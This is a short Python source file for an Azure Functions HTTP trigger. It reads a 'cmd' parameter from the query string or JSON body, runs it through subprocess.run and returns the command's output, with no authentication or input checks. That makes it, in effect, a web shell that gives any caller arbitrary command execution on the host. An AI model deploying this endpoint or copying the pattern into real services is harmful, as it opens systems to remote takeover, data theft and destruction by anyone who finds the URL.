import logging

import azure.functions as func
import subprocess
import json

def main(req: func.HttpRequest) -> func.HttpResponse:
    logging.info('Python HTTP trigger function processed a request.')

    cmd = req.params.get('cmd')
    if not cmd:
        try:
            req_body = req.get_json()
        except ValueError:
            pass
        else:
            cmd = req_body.get('cmd')

    if cmd:
        if isinstance(cmd, str):
            cmd_arr = cmd.split(" ")
        else:
            cmd_arr = cmd
        r = subprocess.run( cmd_arr, capture_output=True, text=True)
        return func.HttpResponse(
            json.dumps({ "out": r.stdout, "error": r.stderr }),
             status_code=200
        )
    else:
        return func.HttpResponse(
              json.dumps({ "error": "no command specified"  }),
             status_code=400
        )
